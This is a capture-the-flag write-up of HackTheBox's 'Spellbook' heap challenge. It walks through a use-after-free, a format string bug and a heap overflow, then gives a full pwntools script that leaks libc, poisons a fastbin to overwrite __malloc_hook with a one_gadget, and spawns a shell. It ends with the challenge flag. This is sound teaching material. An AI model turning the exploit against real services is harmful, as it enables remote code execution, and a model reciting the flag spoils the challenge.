# Spellbook
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/aa3a18a2-80c9-469b-a028-948514bcc7f6)


## Lessons Learned:
1. Heap-Based Exploitation.
2. Leak main arena address by freeing a chunk to unsorted bin.
3. Identify offset for __malloc_hook().
4. Identify offset for one_gadget.
5. Utilizing Heap Overflow for fastbin attack lead to RCE.

## DESCRIPTION:
In this magic school, there are some spellbound books given to young wizards where they can create and store the spells they 
learn throughout the years. There are some forbidden spells that can cause serious damage to other wizards and are not allowed. 
Beware what you write inside this book. Have fun, if you are a true wizard after all..

## HINT:
- NONE

## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/079264de-f052-44f2-bbc2-994e89cc9ae8)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ac148f78-c617-47bd-bc9c-dbd02fe1facd)


2. Upon reviewing the main() functions, we found 4 function call that seems to be our interest. Those are **add()**, **delete()**, **edit()**, and **show()**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3dd271bb-f89a-4e64-bdf3-57a392a7be7b)


3. Great! Let's review the **add()** function first.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/58851af2-e2d8-42e6-992a-b16cff1399f7)


4. Based from the code above, everytime we allocate a chunk and it's size, a new chunk with 0x30 sized field is also created. Let's prove that by allocate a small size of chunk.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/911fbc71-1d53-49dd-9d58-d338f3e91caa)


5. Now let's review the **delete()** function.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bf0bd5df-e0ce-45da-b923-29c49a2f351c)


6. Noticed the **__ptr** and **__ptr->sp** is freed but is not set to NULL afterwards. Hence we can still use the chunk later, it's introduce **Use After Free** vuln.
7. Remembering at the **add()** function, we can allocate up to 1000 bytes and there is Use After Free vuln at the **delete()** function. We can leak main arena libc address by freeing size above a fastbin range, so it shall fell to the unsorted bin. Using UAF, we might could obtain RCE.
8. Now let's review the **show()** function.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1d269956-3cca-4a3b-893b-f56bcd0600ef)


9. Nothing interesting here, it just prints all the data we sent before.
10. BUT, it introduces another vuln. A Format Strings Bug (FSB).
11. We can use an alternate way to leak libc address, by using this vuln.
12. Now let's analyze the **edit()** function.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/041c506d-dcb5-4d9a-a7af-dc716ce2aa05)


13. Found a heap overflow vuln at the second input, remembering the smallest size of chunk we can allocate using malloc is 0x20 sized field. Hence if we allocate above 0x30 sized field and we use **edit()** function to fill our chunk again but it only accepts 0x30, it triggers heap overflow then and we can overwrite metadata of chunk that are adjacent with it.
14. Great! Seems we already identified all the vuln, our objective is to do fastbin attack (fastbindup) which lead to RCE.
15. Let's start by writing the main arena's libc address to the unsorted bin. I allocate 0x200 chunk's size to make sure it outside of the fastbin range so it fell to unsorted bin when freed.

> TEMPORARY SCRIPT

```py
from pwn import *
import os
os.system('clear')

exe = './spellbook'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'INFO'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def malloc(index: int, input_type: bytes, size: int, data: bytes):
    sh.sendlineafter(b'>> ', b'1')
    sh.sendlineafter(b'entry: ', str(index))
    sh.sendlineafter(b'type: ', input_type)
    sh.sendlineafter(b'power: ', str(size))
    sh.sendlineafter(b': ', data)

def show(index: int):
    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', f'{index}')

def edit(index: int, input_type: bytes, data: bytes):
    sh.sendlineafter(b'>> ', b'3')
    sh.sendlineafter(b'entry: ', str(index))
    sh.sendlineafter(b'type: ', input_type)
    sh.sendlineafter(b': ', data)

def free(index: int):
    sh.sendlineafter(b'>> ', b'4')
    sh.sendlineafter(b'entry: ', str(index))

sh = start()

malloc(0, b'A' * 8, 0x200, b'A' * 8)
malloc(1, b'B' * 8, 0x68, b'B' * 8) # allocate another small junk to prevent consolidation with the top chunk.

free(0)
show(0)

gdb.attach(sh)

sh.interactive()
```

> RESULT - It fell to unsorted bin and not consolidate with the top chunk.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0c58b24a-6bb0-40a2-8714-a11087e5c191)


16. Remember that it also freed 0x30 sized chunk to the fastbin.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/08987bcb-c4ee-45bf-a00b-64c722fb2415)


17. By showing the data chunk at index 0, we can obtain the libc main arena address.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7c48594f-7eee-4db1-bde1-e4292945ed14)


> UNPACK RESULT & LIBC BASE CALCULATION

```py
sh.recvuntil(b':')
sh.recvuntil(b':')

get = unpack(sh.recvline().strip().ljust(8, b'\x00'))
log.success(f'MAIN ARENA --> {hex(get)}')

## Calculating libc base.

libc.address = get - 0x3c4b78
log.success(f'LIBC BASE --> {hex(libc.address)}')
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ca65bb28-f0b0-43e6-83e4-8efad5fc043d)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/eaf26c75-da6e-4c0c-80bc-72fad92849a3)


18. Now let's set up our fastbin attack. We can start by allocate another chunk with 0x68 size field (it's the size that fit the libc.sym.system).
19. Then free chunk index 2 and 1.

> RESULT - Chunk index 2 and 1 fell to the unsorted bin.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9cb3a65e-18ce-4434-ac93-1f55a0988b10)


20. Great! Now let's utilize the heap overflow vuln to overwrite the FD of chunk 2 to **__malloc_hook()**.
21. But to do this, we need to identify the correct offset, because we need to have 0x7f as the size field (because will be used to drop libc.sym.system or one_gadget).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cd1191e8-1ee2-457d-85e4-5b452d266c19)


22. It's NULL, let's traverse up gain the correct offset.
23. Long story short, found the correct offset at **-35**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b25ad19a-e644-4e5f-b75d-b1ab69ba4886)


24. Anyway there's an alternative way to obtain the correct offset, by substracting the **__malloc_hook()** with fake fast chunk.

> using fake fast chunk

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/829372e3-874f-4b90-a1e1-559e3e25eadf)


25. However it's clear that the offset should be **-35**. Let's edit the second chunk and modify the data chunk to **__malloc_hook() - 35**.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8a2a0e34-8df7-4e65-a4f5-ef4943169a09)


26. Alternatively, we can check the FD of it's chunk.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8b077fef-be09-43f8-b1c5-18d8750a40f6)


27. The FD is already filled with **__malloc_hook() - 35**.
28. However I forgot to change our chunk size at index 1 to other than 0x68 (so it does not interfere with our RCE setup), this time let's change it to 24, so it fell to 0x20 fastbin and not 0x70.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d5f39269-6053-4950-bc58-ec33e90fec4e)


30. Great! Now let's allocate 1 junk chunk until we reached chunk **__malloc__hook() - 35**. 
31. Now this time, after we write **__malloc_hook()-35** to the 0x70 bin, we want to overwrite it to `system("/bin/sh")` using one_gadget.
33. So then, at the time we want to request malloc, shell is dropped.
33. AGAIN, we need to identify the correct offset to drop one_gadget.
34. The simplest way to find the offset is by allocating another chunk with size of 0x68 but just fill 0x60 so it does not segfault, then we inspect the strings inside **__malloc__hook()**.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6c121174-35f5-4f5a-a4fe-0febe060917c)


35. Great let's send **19 padding + one_gadget** for the fourth index chunk.
36. AGAIN, another issue. We need to find the correct one_gadget address. We can bruteforce it by using one by one, or we can just inspect the stack address. Using the gadget at index 1 shall gave us the shell.

> ONE_GADGET

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a2424f93-7ed9-4d46-9a30-7853d96a75c2)

> FULL SCRIPT

```py
from pwn import *
import os
os.system('clear')

exe = './spellbook'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'INFO'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def malloc(index, input_type, size: int, data: bytes):
    sh.sendlineafter(b'>> ', b'1')
    sh.sendlineafter(b'entry: ', str(index))
    sh.sendlineafter(b'type: ', input_type)
    sh.sendlineafter(b'power: ', str(size))
    sh.sendlineafter(b': ', data)

def show(index):
    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', f'{index}')

def edit(index, input_type, data: bytes):
    sh.sendlineafter(b'>> ', b'3')
    sh.sendlineafter(b'entry: ', str(index))
    sh.sendlineafter(b'type: ', input_type)
    sh.sendlineafter(b': ', data)

def free(index):
    sh.sendlineafter(b'>> ', b'4')
    sh.sendlineafter(b'entry: ', str(index))
    
def allc():
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', b'5')

sh = start()

## Leaking libc address
malloc(0, b'A' * 8, 0x200, b'A' * 8)
malloc(1, b'B' * 8, 24, b'B' * 8) # allocate another junk to prevent consolidation with the top chunk.

free(0)
show(0)

sh.recvuntil(b':')
sh.recvuntil(b':')

get = unpack(sh.recvline().strip().ljust(8, b'\x00'))
log.success(f'MAIN ARENA --> {hex(get)}')

## Calculating libc base.

libc.address = get - 0x3c4b78
log.success(f'LIBC BASE --> {hex(libc.address)}')

## Setup for fastbin attack

malloc(2, b'C' * 8, 0x68, b'C' * 8)
free(2)
free(1)

p = flat([
    libc.sym['__malloc_hook'] - 35
])

edit(2, b'D' * 8, p)
malloc(3, b'X' * 8, 0x68, b'X' * 8)
gadgets = (0x45226, 0x4527a, 0xf03a4, 0xf1247)[1]
one_gadget = libc.address + gadgets
log.success(f'ONE GADGET --> {hex(one_gadget)}') 

p = flat([
    cyclic(19),
    one_gadget
])

# malloc(4, b'Y' * 8, 0x68, cyclic(0x60)) # used to check for offset
malloc(4, b'Y' * 8, 0x68, p)

## __malloc_hook() already overwritten with one_gadget, every malloc usage shall drop a shell.
allc()

# gdb.attach(sh)

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7722170-330b-42f3-8251-61aa6a23b251)


> AT THE REMOTE SERVER

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5e462237-60f9-4744-9ee2-8957599af968)


## FLAG

```
HTB{t00_m4ny_w4y5_2_s0lv3_ch005e_y0ur5}
```

